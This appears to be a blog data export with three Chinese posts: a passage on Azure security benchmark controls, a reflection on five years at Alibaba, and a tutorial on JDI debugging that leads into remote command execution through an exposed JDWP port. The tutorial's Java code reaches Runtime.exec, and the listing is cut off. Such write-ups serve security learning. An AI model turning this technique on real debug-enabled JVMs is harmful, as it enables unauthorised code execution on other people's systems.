在服务中使用客户管理的密钥启用和实施静态数据加密。\nDP-6：使用安全密钥管理流程安全原则：记录并实现企业加密密钥管理标准、流程和过程，以控制密钥生命周期。 如果需要在服务中使用客户管理的密钥，请使用安全的 Key Vault 服务进行密钥生成、分发和存储。 根据定义的计划以及在密钥停用或泄露时轮换和撤销密钥。\nDP-7：使用安全证书管理流程安全原则：记录并实现企业证书管理标准、流程和过程，其中包括证书生命周期控制和证书策略（如果需要公钥基础结构）。使用自动化机制确保及时清查、跟踪、监视和续订组织中的关键服务使用的证书，以避免服务中断。\nDP-8：确保密钥和证书存储库的安全性安全原则：确保用于加密密钥和证书生命周期管理的密钥保管库服务的安全性。 通过访问控制、网络安全、日志记录和监视以及备份强化 Key Vault 服务，以确保始终使用最大安全性保护密钥和证书。\n资产管理资产管理包括用于确保 Azure 资源安全可见性和治理的控制措施，包括以下几方面的建议：安全人员的权限、对资产清单的安全访问，以及管理对服务和资源的审批（盘点、跟踪和更正）。\nAM-1：跟踪资产清单及其风险安全原则：通过查询跟踪资产清单并发现所有云资源。 根据资产的服务性质、位置或其他特征，对资产进行标记和分组，以便从逻辑上组织资产。 确保安全组织能够访问不断更新的资产清单。通过始终集中汇总安全见解和风险，确保安全组织能够监视云资产的风险\nAM-2：仅使用已获批准的服务安全原则：通过审核和限制用户可在环境中预配的服务，确保仅可使用已获批准的云服务。\nAM-3：确保资产生命周期管理的安全安全原则：确保资产的安全属性或配置在资产生命周期内将会一直更新。\nAM-4：限制对资产管理的访问安全原则：限制用户对资产管理功能的访问，避免意外或恶意修改云中的资产。\nAM-5：仅在虚拟机中使用已获批准的应用程序安全原则：通过创建允许列表并阻止未经授权的软件在环境中执行，确保仅已授权的软件才能执行。\n日志记录和威胁检测日志记录和威胁检测涵盖了用于检测 Azure 上的威胁以及启用、收集和存储 Azure 服务的审核日志的控件，包括使用控件启用检测、调查和修正过程，以利用 Azure 服务中的本机威胁检测生成高质量的警报；它还包括使用 Azure Monitor 收集日志，使用 Azure Sentinel 集中进行安全分析、时间同步和日志保留。\nLT-1：启用威胁检测功能安全原则：若要支持威胁检测方案，请监视所有已知资源类型的已知和预期的威胁和异常。 配置警报筛选和分析规则以从日志数据、代理或其他数据源中提取高质量警报，从而减少误报。\nLT-2：为标识和访问管理启用威胁检测安全原则：通过监视用户和应用程序登录和访问异常来检测标识和访问管理威胁。 应针对失败的登录尝试次数过多和使用了订阅中的已弃用帐户等行为模式发出警报。\nLT-3：启用日志记录以进行安全调查安全原则：为云资源启用日志记录，以满足安全事件调查以及安全响应与合规性的要求。\nLT-4：启用网络日志记录以进行安全调查安全原则：为网络服务启用日志记录，以支持与网络相关的事件调查、威胁搜寻和安全警报生成。 网络日志可能包括来自网络服务的日志，例如 IP 筛选、网络和应用程序防火墙、DNS、流量监视等。\nLT-5：集中管理和分析安全日志安全原则：集中记录存储和分析，以实现跨日志数据的关联。 对于每个日志源，请确保已分配数据所有者、访问指南、存储位置、用于处理和访问数据的工具以及数据保留要求。\nLT-6：配置日志存储保留期安全原则：根据合规性、法规和业务要求规划日志保留策略。 在各个日志记录服务中配置日志保留策略，以确保对日志进行正确存档。\nLT-7：使用批准的时间同步源安全原则：为日志记录时间戳使用已获批准的时间同步源，其中包括日期、时间和时区信息。\n事件响应事件响应包括对事件响应生命周期（准备、检测、分析、包含和事后活动）的控制措施，包括使用 Microsoft Defender for Cloud 和 Sentinel 等 Azure 服务自动执行事件响应过程。\nIR-1：准备 - 更新事件响应计划和处理过程安全原则：确保组织遵循行业最佳做法来制定流程和计划，以响应云平台上的安全事件。 请注意共担责任模型以及 IaaS、PaaS 和 SaaS 服务之间的差异。 这将直接影响你与云提供商在事件响应和处理活动方面的协作方式，例如事件通知和会审、证据收集、调查、清除和恢复。\nIR-2：准备 - 设置事件通知安全原则：确保事件响应组织中的正确联系人可以接收来自云服务提供商平台和你的环境的安全警报和事件通知。\nIR-3：检测和分析 - 基于高质量警报创建事件安全原则：确保你有创建高质量警报和衡量警报质量的流程。 这样，你就可以从过去的事件中吸取经验，并为分析人员确定警报的优先级，确保他们不会浪费时间来处理误报。可以基于过去的事件经验、经验证的社区源以及旨在通过融合和关联各种信号源来生成和清理警报的工具构建高质量警报。\nIR-4：检测和分析 - 调查事件安全原则：确保安全运营团队在调查潜在事件时可以查询和使用不同的数据源，以便全面了解发生的情况。 应收集各种各样的日志，以跟踪整个终止链中潜在攻击者的活动，避免出现盲点。 还应确保收集见解和经验，以供其他分析人员使用和用作将来的历史参考资料。\nIR-5：检测和分析 - 确定事件的优先级安全原则：为安全运营团队提供上下文，帮助他们根据组织的事件响应计划中定义的警报严重性和资产敏感度确定应首先关注哪些事件。\nIR-6：遏制、根除和恢复 - 自动执行事件处理安全原则：自动执行重复性手动任务，以加快响应速度并减轻分析人员的负担。 执行手动任务需要更长的时间，这会导致减慢每个事件的速度，并减少分析人员可以处理的事件数量。 手动任务还会使分析人员更加疲劳，这会增加可导致延迟的人为错误的风险，并降低分析人员专注于复杂任务的工作效率。\nIR-7：事后活动 - 吸取教训并保留证据安全原则：定期和/或在发生重大事件后在组织中吸取教训，以提高未来的事件响应和处理能力。根据事件的性质，在事件处理标准中定义的期限内保留与事件相关的证据，以供进一步分析或采取法律措施。\n态势和漏洞管理态势和漏洞管理侧重于评估和改进 Azure 安全状况的控制措施，包括漏洞扫描、渗透测试和修正，以及 Azure 资源中的安全配置跟踪、报告和更正。\nPV-1：定义并建立安全配置安全原则：为云中的不同资源类型定义安全配置基线。 或者，使用配置管理工具在资源部署之前或期间自动建立配置基线，以便在部署后默认情况下环境符合要求。\nPV-2：审核并强制执行安全配置安全原则：如果定义的配置基线存在偏差，则持续监视和发出警报。 通过拒绝不合规的配置或部署配置，根据基线配置强制实施所需的配置。\nPV-3：定义并建立计算资源的安全配置安全原则：为计算资源（如 VM 和容器）定义安全配置基线。 使用配置管理工具在计算资源部署之前或期间自动建立配置基线，以便在部署后默认情况下环境符合要求。 或者，使用预配置的映像将所需的配置基线构建到计算资源映像模板中。\nPV-4：审核并强制执行计算资源的安全配置安全原则：如果计算资源中定义的配置基线存在偏差，则持续监视和发出警报。 通过拒绝不合规的配置或在计算资源中部署配置，根据基线配置强制实施所需的配置。\nPV-5：执行漏洞评估安全原则：按固定计划或按需对所有层的云资源执行漏洞评估。 跟踪和比较扫描结果，以验证是否已修正漏洞。 评估应包括所有类型的漏洞，例如 Azure 服务、网络、Web、操作系统、配置错误等中的漏洞。请注意与漏洞扫描程序使用的特权访问相关的潜在风险。 遵循特权访问安全最佳做法，以保护用于扫描的任何管理帐户。\nPV-6：快速自动地修正漏洞安全原则：快速自动部署补丁和更新，修复云资源中的漏洞。 使用适当的基于风险的方法确定漏洞修复的优先级。 例如，应将较高价值资产中更严重的漏洞作为更高的优先级进行处理。\nPV-7：定期执行红队操作安全原则：模拟真实世界的攻击，以提供组织漏洞的更完整视图。 红队操作和渗透测试补充了传统的漏洞扫描方法，以发现风险。遵循行业最佳做法来设计、准备和进行此类测试，确保它不会对环境造成损害或破坏。 这应始终包括与相关利益干系人和资源所有者讨论测试范围和约束。\n端点安全性终结点安全保护对终结点检测和响应的控制措施，包括在 Azure 环境中对终结点使用终结点检测和响应 (EDR) 和反恶意软件服务。\nES-1：使用终结点检测和响应 (EDR)安全原则：为 VM 启用终结点检测和响应 (EDR) 功能，并与 SIEM 和安全操作流程集成。\nES-2：使用新式反恶意软件安全原则：使用能够实时保护和定期扫描的反恶意软件解决方案。\nES-3：确保反恶意软件和签名已更新安全原则：确保针对反恶意软件解决方案快速一致地更新反恶意软件签名。\n备份和恢复备份和恢复包括用于确保在不同服务层执行、验证和保护数据和配置备份的控制措施。\nBR-1：确保定期执行自动备份安全原则：确保在资源创建期间或通过现有资源的策略对关键业务资源强制执行备份。\nBR-2：保护备份和恢复数据安全原则：确保备份数据和操作免受数据外泄、数据泄露、勒索软件/恶意软件和恶意内部人员的影响。 应该应用的安全控制包括用户和网络访问控制、数据加密（静态和传输中）。\nBR-3：监视器备份安全原则：确保所有业务关键型可保护资源符合定义的备份策略和标准。\nBR-4：定期测试备份安全原则：定期对备份执行数据恢复测试，以验证备份配置和备份数据的可用性是否满足 RTO（恢复时间目标）和 RPO（恢复点目标）中定义的恢复需求。\nDevOps安全性DevOps 安全性涵盖 DevOps 过程中与安全工程和运营相关的控制，包括在部署阶段之前部署关键安全检查（如静态应用安全测试、漏洞管理），以确保整个 DevOps 流程的安全；它还包括常见主题，例如威胁建模和软件供应安全。\nDS-1：执行威胁建模安全原则：执行威胁建模，以识别潜在威胁并枚举缓解威胁的控制。 确保威胁建模具有以下用途：\n\n    在生产运行时阶段保护应用程序和服务。\n\n\n    保护生成工件、基础 CI/CD 管道和其他用于生成、测试和部署的工具环境。 威胁建模至少应包括以下几方面：\n\n\n    定义应用程序的安全要求。 确保在威胁建模中充分满足这些要求。\n\n\n    分析应用程序组件、数据连接及其关系。 确保此分析还包括应用程序范围之外的上游和下游连接。\n\n\n    列出应用程序组件、数据连接以及上游和下游服务可能面临的潜在威胁和攻击途径。\n\n\n    确定可用于缓解枚举威胁的适用安全控制，并识别可能需要制定额外处理计划的任何控制漏洞（例如安全漏洞）。\n\n\n    枚举和设计可以缓解所识别漏洞风险的控制。\n\n\n\nDS-2：确保软件供应链安全性安全原则：确保企业的 SDLC（软件开发生命周期）或流程包括一组安全控制，用于管理应用程序依赖的内部和第三方软件组件（包括专有软件和开源软件）。 定义限制条件，防止将易受攻击组件或恶意组件集成和部署到环境中。软件供应链安全控制至少应包括以下几方面：\n\n    确定开发、生成、集成和部署阶段所需的上游依赖项。\n\n\n    当上游有可用的修补程序时，对内部和第三方软件组件进行盘存和跟踪来发现已知的漏洞。\n\n\n    使用静态和动态应用程序测试评估软件组件中的漏洞和恶意软件，以发现未知的漏洞。\n\n\n    确保使用适当的方法缓解漏洞和恶意软件的威胁。 这可能包括源代码本地修复或上游修复、功能排除和/或应用补偿控制（如果直接缓解不可用）。\n\n\n\n如果在生产环境中使用第三方闭源组件，则可能无法看见其安全状况。 应考虑其他控制，例如访问控制、网络隔离和终结点安全性，以便在出现与组件相关的恶意活动或漏洞时将影响降至最低。\nDS-3：安全 DevOps 基础结构安全原则：确保 DevOps 基础结构和管道遵循各环境（包括生成、测试和生产阶段）中的最佳安全做法。 这通常包括以下范围的安全控制：\n\n    用于存储源代码、生成的包和映像、项目生成工件和业务数据的生成工件存储库。\n\n\n    托管 CI/CD 管道的服务器、服务和工具。\n\n\n    CI/CD 管道配置。\n\n\n\nDS-4：将静态应用程序安全测试集成到 DevOps 管道安全原则：确保静态应用程序安全测试 (SAST) 是 CI/CD 工作流程中限制控制的一部分。 可根据测试结果设置限制，防止易受攻击的包提交到存储库、生成到包中或部署到生产中。\nDS-5：将动态应用程序安全测试集成到 DevOps 管道安全原则：确保动态应用程序安全测试 (DAST) 是 CI/CD 工作流程中限制控制的一部分。 可根据测试结果设置限制，防止漏洞生成到包中或部署到生产中。\nDS-6：在整个 DevOps 生命周期内加强工作负载的安全性安全原则：确保在开发、测试和部署阶段的整个生命周期内保护工作负载。 使用 Azure 安全基准评估可以在默认情况下设置为护栏或在部署阶段之前左移的控制（例如网络安全、标识管理、特权访问等）。 具体而言，请确保在 DevOps 过程中实现以下控制：\n\n    在 CI/CD 工作流、基础结构管理（基础结构即代码）和测试中使用 Azure 或第三方工具实现自动部署，以减少人为错误和攻击面。\n\n\n    确保 VM、容器映像和其他生成工件免受恶意操纵。\n\n\n    在 CI/CD 工作流中进行部署之前，扫描工作负载生成工件（也就是容器映像、依赖项、SAST 和 DAST 扫描）\n\n\n    在生产环境中部署漏洞评估和威胁检测功能，并在运行时持续使用这些功能。\n\n\n\nDS-7：在 DevOps 中启用日志记录和监视安全原则：确保日志记录和监视范围包括 DevOps（和任何其他开发过程）中使用的非生产环境和 CI/CD 工作流元素。 如果未正确监视生产环境，针对这些环境的漏洞和威胁会给生产环境带来巨大的风险。 还应监视 CI/CD 生成、测试和部署工作流中的事件，以识别 CI/CD 工作流作业中的任何偏差。\n治理和策略治理和策略提供的指导可确保使用一致的安全策略和记录在案的治理方法来指导和维持安全保障，包括为不同的云安全功能、统一的技术策略以及支持策略和标准建立角色和责任。\nGS-1：使组织角色、责任和职责一致指导：确保为安全组织中的角色和职责定义并传达清晰的策略。 优先考虑提供涉及安全决策的明确责任，对每个人进行共同职责模式培训，并为技术团队传授保护云的技术。\nGS-2：定义并实现企业分段/职责分离策略指导：建立企业级的策略，将标识、网络、应用程序、订阅、管理组和其他控制措施结合使用以对资产的访问进行分段。仔细权衡安全分离需求与为需要彼此通信并访问数据的系统启用日常操作的需求。确保在工作负载中一致地实现分段策略，包括网络安全、标识和访问模型、应用程序权限/访问模型，以及人机过程控制。\nGS-3：定义并实现数据保护策略指导：在 Azure 中建立企业级的数据保护策略：\n\n    根据企业数据管理标准和法规合规性，定义并应用数据分类和保护标准，从而决定每个级别的数据分类所需的安全控制措施。\n\n\n    设置与企业分段策略一致的云资源管理层次结构。 企业分段策略还应根据敏感的或业务关键型的数据和系统的位置来确定。\n\n\n    在云环境中定义和应用适用的零信任原则，以避免基于外围网络位置来实现信任。 请改用设备和用户信任声明来限制对数据和资源的访问。\n\n\n    跟踪和最大程度地减少整个企业中的敏感数据占用量（存储、传输和处理），以减少攻击面和数据保护成本。 请尽可能考虑工作负载中的单向哈希处理、截断和词汇切分等方法，以避免以原始形式存储和传输敏感数据。\n\n\n    确保有一个完整的生命周期控制策略为数据和访问密钥提供安全保障。\n\n\n\nGS-4：定义并实现网络安全策略指导：建立 Azure 网络安全策略，作为组织访问控制的总体安全策略的一部分。 此策略应包括针对以下元素的记录在案的指南、策略和标准：\n\n    设计集中/分散网络管理和安全责任模型，以便部署和维护网络资源。\n\n\n    与企业分段策略一致的虚拟网络分段模型。\n\n\n    Internet 边缘及入口和出口策略。\n\n\n    混合云和本地互连策略。\n\n\n    网络监视和日志记录策略。\n\n\n    最新的网络安全项目（例如网络关系图、参考网络体系结构）。\n\n\n\nGS-5：定义并实现安全状况管理策略指导：建立策略、过程和标准，以确保安全配置管理和漏洞管理在云安全任务中落实就位。\nGS-6：定义并实现标识和特权访问策略指导：建立 Azure 标识和特权访问方法，将其作为组织总体安全访问控制策略的一部分。 此策略应包括针对以下方面的记录在案的指导、策略和标准：\n\n    集中标识和身份验证系统 (Azure AD) 及其与其他内部和外部标识系统的互连\n\n\n    特权标识和访问治理（如访问请求、评审和批准）\n\n\n    紧急（破窗式）情况下的特权帐户\n\n\n    在不同用例和条件中使用强身份验证（无密码身份验证和多重身份验证）方法\n\n\n    通过 Azure 门户、CLI 和 API 执行管理操作，保障访问安全。\n\n\n\n对于未使用企业系统的例外情况，请确保具备足够的安全控制措施以用于标识、身份验证和访问管理以及治理。 企业团队应批准和定期查看这些例外。 这些例外通常出现在以下情况：\n\n    使用非企业指定的标识和身份验证系统，如基于云的第三方系统（可能引发未知风险）\n\n\n    特权用户在本地进行了身份验证和/或使用非强身份验证方法\n\n\n\nGS-7：定义并实现日志记录、威胁检测和事件响应策略指导：建立日志记录、威胁检测和事件响应策略，以快速检测和修正威胁并满足合规性要求。 安全操作 (SecOps / SOC) 团队应注重实施高质量警报和无缝体验，以便能够专注于威胁，而不是过多关注记录集成和手动步骤。此策略应包括以下方面的记录在案的策略、过程和标准：\n\n    安全运营 (SecOps) 组织的角色和职责\n\n\n    一个明确定义的定期测试的事件响应计划，以及与 NIST 或其他行业框架一致的处理流程。\n\n\n    与客户、供应商和公开的利益相关方之间的通信和通知计划。\n\n\n    优先使用扩展检测和响应 (XDR) 功能（如 Azure Defender 功能）来检测各方面的威胁。\n\n\n    使用 Azure 原生功能（例如 Microsoft Defender for Cloud）的和第三方的平台进行事件处理，例如日志记录和威胁检测、取证以及攻击补救和清除。\n\n\n    定义主要方案（例如威胁检测、事件响应和合规性），并设置日志捕获和保留以满足方案要求。\n\n\n    使用 SIEM、原生 Azure 威胁检测功能和其他源来集中查看与威胁相关的关联信息。\n\n\n    事件后活动，如经验教训和证据保留。\n\n\n\nGS-8：定义并实现备份和恢复策略指导：为组织制定 Azure 备份和恢复策略。 此策略应包括以下方面的记录在案的指导、策略和标准：\n\n    符合你业务复原目标的恢复时间目标 (RTO) 和恢复点目标 (RPO) 定义，以及法规合规性要求。\n\n\n    用于云和本地的应用程序和基础结构中的冗余设计（包括备份、恢复和复制）。 请考虑在策略中使用区域、区域对、跨区域恢复和非现场存储位置。\n\n\n    使用数据访问控制、加密和网络安全等控制措施对备份进行保护，以防未经授权的访问和篡改。\n\n\n    使用备份和恢复来减小出现的威胁（如勒索软件攻击）带来的风险。 并且还可以保护备份和恢复数据本身，使其免受这些攻击。\n\n\n    出于审核和警报目的，监视备份和恢复数据以及操作。\n\n\n\nGS-9：定义并实现终结点安全策略指导：建立云终结点安全策略，其中包括以下方面：\n\n    将终结点检测和响应以及反恶意软件功能部署到终结点，并与威胁检测和 SIEM 解决方案及安全操作过程集成。\n\n\n    遵循 Azure 安全基准，以确保其他各方面（如网络安全性、状态漏洞管理、标识和特权访问，以及日志记录和威胁检测）与终结点相关的安全设置已到位，从而能为终结点提供深度防御保护。\n\n\n    为生产环境中的终结点安全性设置优先级，但要确保非生产环境（如 DevOps 过程中使用的测试和生成环境）也受到保护和监视，因为这些环境也可用于将恶意软件和漏洞引入到生产环境中。\n\n\n\nGS-10：定义并实现 DevOps 安全策略指导：将安全控制强制作为组织 DevOps 工程和操作标准的一部分。 根据组织中的企业和云安全标准，定义安全目标、控制要求和工具规范。建议将 DevOps 用作你组织中的基本操作模型，因为这样可以在整个 CI/CD 工作流中使用不同类型的自动化操作（例如基础结构即代码预配和 SAST 和 DAST 自动扫描）来快速识别和修复漏洞。 通过这种“左移”方法，还可以更多地了解部署管道中的情况并在其中强制执行一致的安全检查，从而提前将安全护栏有效地部署到环境中，以避免在将工作负载部署到生产环境中时出现最后一分钟的安全意外。当将安全控制向左转移到预先部署阶段时，请实现安全护栏以确保在整个 DevOps 过程中部署和执行控制。 此技术可能包含 Azure ARM 模板，可用于定义 IaC（基础结构即代码）中的护栏、资源预配和 Azure Policy，从而审核和限制可在环境中预配的服务或配置。对于工作负载的运行时安全控制，请遵循 Azure 安全基准，设计和实现有效的控制，如标识和特权访问、网络安全、终结点安全性，以及工作负载应用程序和服务中的数据保护。\n参考：https://docs.microsoft.com/zh-cn/security/benchmark/azure/\n","categories":["安全架构"],"tags":["Cloud"]},{"title":"五年陈","url":"/%E4%BA%94%E5%B9%B4%E9%99%88/","content":"朋友圈看到好多前同事晒五年陈的戒指\n些许恍惚\n如果没有离职，今天大概也拿到那枚戒指了\n记忆扑面而来\n掰着指头算算\n去离之间，也度过了五个春秋\n两年成长，三载磨砺，转瞬即逝\n这酒或许陈了吧，阿里味\n\n“在这里，没有人会主动给你具体的任务的”\n原话记不清，但是意思差不多，对我影响也是最大的\n目标或清晰或模糊，但大致方向是看的到的，中间的路怎么走，是需要自己去思考的\n起初很难，尝试性的做一些事情，一不小心就困到自我中心的幻境\n后来很爽，每一步都是在逼自己，站在全局的角度，站在做事的角度\n贯穿了几乎整个旅程\n从最开始去探索各种自动化工具、学习各种软硬技能，发现挖掘不同阶段的治理重心，一次次的调整优化团队分工，总结提炼出风险治理的方法论、团队的成长路径，等等\n几乎所有的任务都是自己给自己定的，结果也还不错\n\n“来这一趟，总要做成几件事吧”\n工作到底是要“工资”驱动还是“价值”驱动呢\n这是收获的第二句\n周末晚上和朋友们在洗脚时聊起来未来的打算\n面向“创造价值”还是“赚取金钱”呢\n这么多年过去了，大家的选择还是没变\n大概这也是现在都还是穷逼的的原因吧\n要做成事很难，需要“既要又要还要”，需要“过程”，更需要“结果”\n“做事”“成事”，或许只有经历过的才能理解\n\n“快乐工作，认真生活”\n这八个字，到现在还在悟，不知何时才能悟透\n最初选择留下，最主要的原因是因为当时的团队氛围\n来到这里，发现为什么会有这么融洽的氛围，遇到了很多“贵人”\n不是说他们帮了我什么，而是他们在那，就足够去学习了，直至今日，也只学点皮毛\n\n\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"从编写JDI调试到实现JDWP命令执行","url":"/%E4%BB%8E%E7%BC%96%E5%86%99JDI%E8%B0%83%E8%AF%95%E5%88%B0%E5%AE%9E%E7%8E%B0JDWP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"1.JPDAJPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。JPDA 主要由三个部分组成：\nJava 虚拟机工具接口（JVMTI）\nJava 调试线协议（JDWP）\nJava 调试接口（JDI）\n\n\n2.JVM TIJVMTI其实就是一套由虚拟机直接提供的本地代码接口，包含了调试、监听、线程分析及覆盖率分析等接口，它处于整个JPDA体系的最底层。\n一般可以通过采用建立一个Agent的方式来使用JVMTI，其显著的特征就是通过设置回调函数的方式，从java虚拟机上得到当前运行态信息，并做出自己的相应的操作，抑或操作虚拟机的运行态，以达到一些特定的目的（如优化程序性能）。\n把Agent编译成一个动态链接库后，就可以在java程序启动/运行的时候（增加启动参数agentlib/ agentpath）来加载它。\n以启动时加载为例:\n\n3.JDWPJDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。\nTarget vm 中运行着我们希望要调试的程序，它与一般运行的 Java 虚拟机没有什么区别，只是在启动时加载了 Agent JDWP 从而具备了调试功能。\ndebugger 向运行中的 target vm 发送命令来获取 target vm 运行时的状态和控制 Java 程序的执行。\n3.1JDWP Start Up在建立传输链接之后，连接的两端首先会进行握手，然后再进行其它数据包的传输。握手的步骤有以下两步：    1. debugger侧发送14 bytes 的 14个ASCII字符 “JDWP-Handshake”到VM中；    2. VM回复相同的14 bytes “JDWP-Handshake” 完成握手。\nhttps://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html\n3.2Packet结构命令包（command packet）和回复包（reply packet），Packet分为包头（header）和数据（data）两部分组成。包头部分的结构和长度是固定的，而数据部分的长度是可变的。command packet和reply packet的包头长度相同，都是11个bytes。\n\nLength 和 Id 字段是不言自明的。Flag 字段仅用于区分请求包和回复包，值为 0x80 表示回复包。CommandSet 字段定义了命令的类别，如下表所示。 \n命令集\t      命令0x40\t       JVM 采取的行动（例如设置断点）0x40–0x7F\t   向调试器提供事件信息（例如，JVM 已达到断点并等待进一步的操作）0x80\t       第三方扩展\n\n请记住，我们要执行任意代码，以下命令对我们来说是最有趣的。    •    VirtualMachine/IDSizes 定义了 JVM 处理的数据结构的大小。这是 nmap 脚本 jdwp-exec.nse[11] 不起作用的原因之一，因为该脚本使用硬编码的大小。    •    ClassType/InvokeMethod 允许您调用静态函数。    •    ObjectReference/InvokeMethod 允许您从 JVM 中的实例化对象调用函数。    •    StackFrame/(Get|Set)Values 提供从线程堆栈推送/弹出功能。    •    Event/Composite 强制 JVM 对该命令声明的特定行为做出反应。此命令是调试目的的主要关键，因为它允许设置断点，在运行时单步执行线程，并在以与 GDB 或 WinDBG 完全相同的方式访问/修改值时收到通知。 JDWP 不仅允许您访问和调用已驻留在内存中的对象，还允许您创建或覆盖数据。    •    VirtualMachine/CreateString 允许您将字符串转换为存在于 JVM 运行时中的 java.lang.String。    •    VirtualMachine/RedefineClasses 允许您安装新的类定义。\n上述的定义是重要的，JDI可以利用invokeMethod调用目标 VM 中此对象的指定方法，这是实现命令执行的关键\nObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);…….ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);\n\n\n3.3Using JDWPjava -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8000\n-agentlib:jdwp ：JVM加载jdwp代理\ntransport=dt_socket ： 使用socket传输\nserver=y ： JVM将listen for a debugger注入到其中\nsuspend=y  ： JVM在执行主类之前等待debugger attach，如果设置为n，则直接执行主类，同时进行监听\naddress=8000 ： 指定套接字的端口，在JDK9及以后，这种配置只监听localhost的8000端口\n\n4.Debug过程1、先建立起了 socket 连接\n2、将断点位置创建了断点事件通过 JDI 接口传给了 服务端（程序端）的 VM，VM 调用 suspend 将 VM 挂起\n3、VM 挂起之后将客户端需要获取的 VM 信息返回给客户端，返回之后 VM resume 恢复其运行状态\n4、客户端获取到 VM 返回的信息之后可以通过不同的方式展示给客户\n4.1基于JDI编写一个调试代码1.创建Connector\nVirtualMachineManager vmm = Bootstrap.virtualMachineManager();List&lt;AttachingConnector&gt; connectors = vmm.attachingConnectors();SocketAttachingConnector sac = null;for (AttachingConnector ac : connectors) &#123;    if (ac instanceof SocketAttachingConnector) &#123;        sac = (SocketAttachingConnector) ac;        break;    &#125;&#125;if (sac == null) &#123;    System.out.println(&quot;JDI error&quot;);    return;&#125;\n2.链接到JVM\nMap&lt;String, Connector.Argument&gt; arguments = sac.defaultArguments();Connector.Argument hostArg = (Connector.Argument) arguments.get(HOST);Connector.Argument portArg = (Connector.Argument) arguments.get(PORT);hostArg.setValue(&quot;127.0.0.1&quot;);portArg.setValue(String.valueOf(8800));vm = sac.attach(arguments);process = vm.process();eventRequestManager = vm.eventRequestManager();\n\n3.获取要调试的类和方法名称\nList&lt;ReferenceType&gt; classesByName = vm.classesByName(&quot;test.Test&quot;);if (classesByName == null || classesByName.size() == 0) &#123;    System.out.println(&quot;No class found&quot;);    return;&#125;ReferenceType rt = classesByName.get(0);List&lt;Method&gt; methodsByName = rt.methodsByName(&quot;printHello&quot;);if (methodsByName == null || methodsByName.size() == 0) &#123;    System.out.println(&quot;No method found&quot;);    return;&#125;Method method = methodsByName.get(0);\n\n4.设置要调试的断点\n获取断点进程\nBreakpointEvent breakpointEvent = (BreakpointEvent) event;ThreadReference threadReference = breakpointEvent.thread();StackFrame stackFrame = threadReference.frame(0);stackFrame.visibleVariables();\n\n设置断点位置和断点事件\n// Get locationReferenceType referenceType = classPrepareEvent.referenceType();List locations = referenceType.locationsOfLine(34);Location location = (Location) locations.get(0);// Create BreakpointEventBreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(location);breakpointRequest.setSuspendPolicy(EventRequest.SUSPEND_ALL);breakpointRequest.enable();\n\n\n5.监听断点并执行调试\nvm.setDebugTraceMode(VirtualMachine.TRACE_EVENTS);vm.resume();List&lt;Location&gt; locations = classesByName.get(0).locationsOfLine(34);BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(locations.get(0));breakpointRequest.enable();eventLoop();  //要调试的断点和执行\n\n\n5.JDWP 命令执行原理原理部分参考：https://ioactive.com/hacking-java-debug-wire-protocol-or-how/\n\n获取 Java 运行时参考JVM 通过对象的引用来操作对象。因此，我们的漏洞利用必须首先获取对 java.lang.Runtime 类的引用。从这个类中，我们需要对 getRuntime() 方法的引用。这是通过获取所有类（AllClasses 数据包）和我们正在寻找的类中的所有方法（ReferenceType/Methods 数据包）来执行的。\n \n设置断点并等待通知（异步调用）这是我们利用的关键。要调用任意代码，我们需要处于正在运行的线程上下文中。为此，hack 是在已知在运行时调用的方法上设置断点。如前所述，JDI 中的断点是一个异步事件，其类型设置为 BREAKPOINT(0x02)。当命中时，JVM 向我们的调试器发送一个 EventData 数据包，其中包含我们的断点 ID，更重要的是，对命中它的线程的引用。\n\n\n因此，将其设置在经常调用的方法上是一个好主意，例如 java.net.ServerSocket.accept()，每次服务器接收到新的网络连接时很可能会调用该方法。但是，必须记住，它可以是运行时存在的任何方法。 3.在Runtime中分配一个Java String对象来执行payload我们将在 JVM 运行时中执行代码，因此我们所有的操作数据（如字符串）必须存在于 JVM 运行时中（即拥有运行时引用）。这很容易通过发送 CreateString 命令来完成。\n\n\n从断点上下文中获取运行时对象在这一点上，我们几乎拥有成功、可靠利用所需的所有元素。我们缺少的是运行时对象引用。获取很简单，我们可以简单的在JVM运行时执行java.lang.Runtime.getRuntime()静态方法[8]，通过发送ClassType/InvokeMethod包并提供Runtime类和线程引用。\n \n在Runtime实例中查找并调用exec()方法最后一步是简单地在上一步获得的运行时静态对象中查找 exec() 方法，并使用我们在第三步中创建的 String 对象调用它（通过发送 ObjectReference/InvokeMethod 数据包）。\n\n \n6.基于JDI实现命令调用private static void exec(ThreadReference threadReference) throws Exception &#123;        //目标虚拟机中对象的类型。 ReferenceType包含The Java™ Language Specification中定义的类，接口和数组类型。 所有ReferenceType对象都属于以下子接口之一： ClassType用于类， InterfaceType用于接口， ArrayType用于阵列。 请注意，原始类（例如Integer.TYPE的reflected type ）被表示为ClassType。        // VM为所有三个创建Class对象，因此从VM的角度来看，每个ReferenceType映射到一个不同的Class对象。        /*//获取对象            Class cls = Class.forName(&quot;java.lang.Runtime&quot;);            //实例化对象            Object ob = cls.getMethod(&quot;getRuntime&quot;,null).invoke(null,null);            // 反射调用执行命令            cls.getMethod(&quot;exec&quot;, String.class).invoke(ob,&quot;calc&quot;);*/        ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();        Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);        //Java.lang.Class.getMethod()        //返回一个 Method 对象        Method getMethodInvoke = vm.classesByName(&quot;java.lang.reflect.Method&quot;).get(0).methodsByName(&quot;invoke&quot;).get(0);        //java.lang.reflect.Method.invoke        Method getExecMethod = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).methodsByName(&quot;exec&quot;).get(0);        //java.lang.Runtime.exec        List&lt;Value&gt; param1 = new ArrayList&lt;&gt;();        